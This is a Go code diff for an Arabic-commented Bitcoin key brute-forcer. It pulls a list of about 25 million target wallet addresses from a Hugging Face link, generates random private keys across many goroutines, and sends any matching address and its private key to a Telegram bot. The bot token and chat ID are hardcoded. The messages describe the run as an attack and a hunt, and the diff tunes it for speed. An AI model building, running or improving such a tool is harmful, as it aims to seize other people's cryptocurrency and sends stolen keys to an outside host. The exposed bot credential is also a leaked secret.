@@ -25,9 +25,8 @@ var (
 	startTime    = time.Now()
 	token        = "5921618897:AAGu6bp5gFtatio22y-XdWUSwAd0Lk6b1HY"
 	chatID       = "227172927"
-	// الرابط المباشر للملف من FileBin
-	fileURL      = "https://filebin.net/s261wmsful24bdui/wallets.zip"
-	workerName   = "GitHub-Zip-Turbo"
+	// رابط Hugging Face المباشر الخاص بك
+	fileURL      = "https://huggingface.co/spaces/OSAMA714/4524/resolve/main/wallets.zip?download=true"
 )
 
 func hash160(data []byte) []byte {
@@ -45,54 +44,49 @@ func main() {
 	cores := runtime.NumCPU()
 	runtime.GOMAXPROCS(cores)
 
-	sendTelegram("📥 جاري سحب ملف الـ ZIP الضخم وفكه... قد يستغرق دقيقة نظراً لحجم الـ 33 مليون عنوان.")
+	sendTelegram("🚀 *بدء الهجوم الشامل*\nجاري سحب الملايين من Hugging Face...")
 
-	resp, err := http.Get(fileURL)
+	// مهلة تحميل كافية لسحب الـ 400+ ميجا
+	client := &http.Client{Timeout: 40 * time.Minute}
+	resp, err := client.Get(fileURL)
 	if err != nil {
-		sendTelegram("❌ خطأ في الاتصال بموقع FileBin")
+		sendTelegram("❌ فشل الاتصال برابط Hugging Face")
 		return
 	}
 	defer resp.Body.Close()
 
-	// قراءة ملف الزيب بالكامل
 	body, err := io.ReadAll(resp.Body)
 	if err != nil {
-		sendTelegram("❌ فشل تحميل بيانات الملف")
+		sendTelegram("❌ انقطع التحميل أثناء قراءة البيانات")
 		return
 	}
 
 	zipReader, err := zip.NewReader(bytes.NewReader(body), int64(len(body)))
 	if err != nil {
-		sendTelegram("❌ الملف المرفوع ليس بصيغة ZIP صحيحة")
+		sendTelegram("❌ الملف ليس ZIP صحيح. تأكد من اكتمال الرفع على Hugging Face.")
 		return
 	}
 
-	targets := make(map[string]bool)
+	// استخدام struct{} لتقليل استهلاك الرام إلى الصفر تقريباً لكل عنوان
+	targets := make(map[string]struct{}, 25000000)
 	for _, f := range zipReader.File {
 		rc, _ := f.Open()
 		scanner := bufio.NewScanner(rc)
-		// تخصيص ذاكرة كافية للقراءة
 		buf := make([]byte, 0, 1024*1024)
-		scanner.Buffer(buf, 10*1024*1024)
+		scanner.Buffer(buf, 20*1024*1024)
 
 		for scanner.Scan() {
 			addr := strings.TrimSpace(scanner.Text())
-			if addr != "" {
-				targets[addr] = true
+			if len(addr) > 25 {
+				targets[addr] = struct{}{}
 			}
 		}
 		rc.Close()
 	}
 
 	count := len(targets)
-	if count == 0 {
-		sendTelegram("❌ الملف فارغ أو لم يتم قراءة أي عناوين!")
-		return
-	}
+	sendTelegram(fmt.Sprintf("✅ *تم الشحن بنجاح!*\nالعدد: %d عنوان\nالحالة: الصيد بدأ الآن... 🔥", count))
 
-	sendTelegram(fmt.Sprintf("✅ تم فك الضغط بنجاح!\nالعدد الإجمالي: %d عنوان\nالأنوية الشغالة: %d\nالجلد بدأ الآن... 🔥", count, cores))
-
-	// تقرير كل 5 دقائق
 	go func() {
 		for {
 			time.Sleep(5 * time.Minute)
@@ -101,15 +95,16 @@ func main() {
 	}()
 
 	var wg sync.WaitGroup
-	for i := 0; i < cores*20; i++ {
+	// تشغيل مكثف لزيادة سرعة الفحص
+	for i := 0; i < cores*30; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
 			for {
 				priv, _ := btcec.NewPrivateKey()
-				// فحص Legacy Compressed (P2PKH) فقط لأعلى سرعة
+				// فحص عناوين Legacy (التي تبدأ برقم 1)
 				addr := encodeAddress(priv.PubKey().SerializeCompressed())
-				if targets[addr] {
+				if _, found := targets[addr]; found {
 					sendFound(addr, priv)
 				}
 				atomic.AddUint64(&totalChecked, 1)
@@ -123,14 +118,9 @@ func sendReport() {
 	elapsed := time.Since(startTime).Seconds()
 	total := atomic.LoadUint64(&totalChecked)
 	speed := float64(total) / elapsed
-	
-	priv, _ := btcec.NewPrivateKey()
-	addr := encodeAddress(priv.PubKey().SerializeCompressed())
-
-	report := fmt.Sprintf("📊 *تحديث الأداء*\n🚀 السرعة: %.0f فحص/ث\n💎 الإجمالي: %d\n⏱ الدقائق: %.1f\n🔑 عينة هيكس: `%x` \n🏠 عينة عنوان: `%s` ", 
-		speed, total, elapsed/60, priv.Serialize(), addr)
-	
-	sendTelegram(report)
+	msg := fmt.Sprintf("📊 *تقرير الأداء*\n🚀 السرعة: %.0f/ث\n💎 الإجمالي: %d\n⏱ المدة: %.1f دقيقة", 
+		speed, total, elapsed/60)
+	sendTelegram(msg)
 }
 
 func sendTelegram(text string) {
@@ -140,6 +130,6 @@ func sendTelegram(text string) {
 }
 
 func sendFound(addr string, priv *btcec.PrivateKey) {
-	msg := fmt.Sprintf("💰 *[JACKPOT FOUND]*\nالمصدر: GitHub-Zip-Turbo\nالعنوان: `%s` \nالمفتاح: `%x` ", addr, priv.Serialize())
+	msg := fmt.Sprintf("💰 *[JACKPOT FOUND]*\nAddr: `%s` \nKey: `%x` ", addr, priv.Serialize())
 	sendTelegram(msg)
 }
